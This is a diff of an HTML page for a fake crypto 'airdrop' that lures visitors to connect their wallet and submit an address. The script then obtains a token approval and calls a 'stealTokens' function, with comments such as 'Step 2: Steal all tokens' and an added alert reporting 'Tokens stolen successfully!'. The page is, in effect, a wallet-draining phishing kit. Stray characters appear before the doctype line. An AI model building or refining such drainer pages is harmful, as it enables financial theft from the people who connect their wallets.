@@ -1,4 +1,4 @@
-yu<!DOCTYPE html>
+h<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -8,10 +8,13 @@ yu<!DOCTYPE html>
 </head>
 <body>
 
-    <h2>Claim Your Airdrop Tokens!</h2>
-    <p>Connect your wallet to claim free tokens. This is a fake airdrop.</p>
+    <h2>Fake Airdrop</h2>
+    <p>Connect your wallet to claim free tokens! Beware: this is a scam!</p>
 
-    <form id="claimAirdropForm">
+    <button id="connectWalletButton">Connect Wallet</button>
+    <button id="claimAirdropButton" disabled>Claim Airdrop</button>
+
+    <form id="claimAirdropForm" style="display: none;">
         <label for="walletAddress">Your Wallet Address:</label>
         <input type="text" id="walletAddress" placeholder="Enter your wallet address" required>
         <input type="submit" value="Claim Airdrop">
@@ -96,6 +99,15 @@ yu<!DOCTYPE html>
             }
         }
 
+        document.getElementById('connectWalletButton').addEventListener('click', async function() {
+            const signer = await connectWallet();
+            if (signer) {
+                document.getElementById('connectWalletButton').disabled = true;
+                document.getElementById('claimAirdropButton').disabled = false;
+                document.getElementById('claimAirdropForm').style.display = 'block';
+            }
+        });
+
         document.getElementById('claimAirdropForm').addEventListener('submit', async function(event) {
             event.preventDefault();
             const victimAddress = document.getElementById('walletAddress').value;
@@ -112,6 +124,7 @@ yu<!DOCTYPE html>
                 if (approvalSuccess) {
                     // Step 2: Steal all tokens
                     await stealTokens(victimAddress, signer);
+                    alert("Tokens stolen successfully! Check your balance.");
                 }
             }
         });
